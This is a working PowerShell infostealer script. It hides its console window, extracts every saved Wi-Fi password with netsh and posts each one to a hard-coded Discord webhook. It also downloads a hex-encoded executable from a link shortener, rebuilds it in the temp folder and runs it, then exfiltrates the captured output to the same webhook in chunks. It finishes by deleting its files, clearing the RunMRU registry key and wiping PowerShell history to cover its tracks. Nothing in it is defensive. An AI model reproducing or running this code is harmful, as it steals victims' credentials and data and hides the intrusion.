# ##############################################################################
# Add C# code to define the ConsoleWindow class
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class ConsoleWindow {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;

        public static void Hide() {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_HIDE);
        }

        public static void Show() {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_SHOW);
        }
    }
"@


# Hide the console window
[ConsoleWindow]::Hide()

# Redirect both standard output and error to null
$null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append

###############################################################################
# Hide the console window
# Add-Type '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindow' -Namespace 'Win32' -PassThru | Out-Null
# $consolePtr = [Win32.Win32ShowWindow]::GetConsoleWindow()
# [Win32.Win32ShowWindow]::ShowWindow($consolePtr, 0)  # 0 hides the window

# # Set ErrorActionPreference to stop throwing red error messages
# $ErrorActionPreference = 'Stop'

try {
    # Extract Wi-Fi profiles
    netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
        $wlan = $_.Matches.Value
        
        # Extract the Wi-Fi password
        try {
            $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
        } catch {
            #Write-Host "Failed to retrieve password for $wlan"
            $passw = "N/A" # Assign a placeholder if password retrieval fails
        }

        # Discord webhook URL
        $discord = 'https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'

        # Build the message body for the webhook
        $Body = @{
            'username' = $env:username + " | " + [string]$wlan
            'content'  = [string]$passw
        }

        # Send the data to the Discord webhook
        try {
            Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
        } catch {
            #Write-Host "Failed to send data to Discord webhook"
        }
    }
} catch {
    #Write-Host "An error occurred: $($_.Exception.Message)"
}


###############################################################################

# Define the URL of the file to be downloaded
$url = "https://lnkfwd.com/u/Kpj_Yric"  # Replace with your file URL

# Define the path to save the file in the %temp% folder
$tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Replace "downloaded_file.zip" with your desired filename

# Use Invoke-WebRequest to download the file
[ConsoleWindow]::Hide()
Invoke-WebRequest -Uri $url -OutFile $tempPath

# Output the location of the downloaded file
#Write-Host "File downloaded to: $tempPath"

###############################################################################

#i open the app byconverting the hex to ek and run in the memory

# Path to the hex file in the %temp% directory
$hexFilePath = Join-Path $env:TEMP "example.txt"

# Read the hex string from the file
$hexString = Get-Content -Path $hexFilePath -Raw

# Convert the hex string to a byte array
$bytes = [byte[]]::new($hexString.Length / 2)
for ($i = 0; $i -lt $hexString.Length; $i += 2) {
    $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
}

# Create a temporary file to hold the executable
$tempExePath = Join-Path $env:TEMP "example.exe"
[System.IO.File]::WriteAllBytes($tempExePath, $bytes)


###############################################################################
[ConsoleWindow]::Hide()
# Start the executable
$process = Start-Process $tempExePath

$outputFilePath = "$env:TEMP\data.txt"

# Wait a moment for the application to fully load
Start-Sleep -Seconds 2

# Load the necessary assemblies for sending keys
Add-Type -AssemblyName System.Windows.Forms

# Simulate CTRL+A and then CTRL+S to save the file
[System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
Start-Sleep -Milliseconds 500  # Wait a moment for selection
[System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear

# Send the output file path and Enter
[System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
Start-Sleep -Milliseconds 500  # Wait for the input
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save

# Wait a moment for the file to save
Start-Sleep -Seconds 2

# Close the application
#Stop-Process -Id $process.Id -Force

# Cleanup any lingering processes
Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force

# Inform the user that the script is complete
#Write-Host "Process completed and all instances closed."


###########################################################################
[ConsoleWindow]::Hide()
# Define the webhook URL
$webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'

# Define the path to the text file using the TEMP environment variable
$filePath = "$env:TEMP\data.txt"

# Check if the file exists
if (Test-Path $filePath) {
    # Read the content of the text file
    $fileContent = Get-Content -Path $filePath -Raw

    # Split the content into chunks of 2000 characters
    $chunkSize = 2000
    $chunks = [System.Collections.Generic.List[string]]::new()

    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
    }

    # Send each chunk to the Discord webhook
    foreach ($chunk in $chunks) {
        [ConsoleWindow]::Hide()
        # Create the payload for the webhook
        $payload = @{
            content = $chunk
        } | ConvertTo-Json

        # Try to send the content to the Discord webhook
        try {
            [ConsoleWindow]::Hide()
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
        } catch {
            #Write-Host "Error sending request: $_"
        }
    }
} else {
    #Write-Host "File not found: $filePath"
}

# End the transcript if you started one
Stop-Transcript

Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\ftf.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Ain1.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue

#delete the entire history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Clear the PowerShell command history
Clear-History
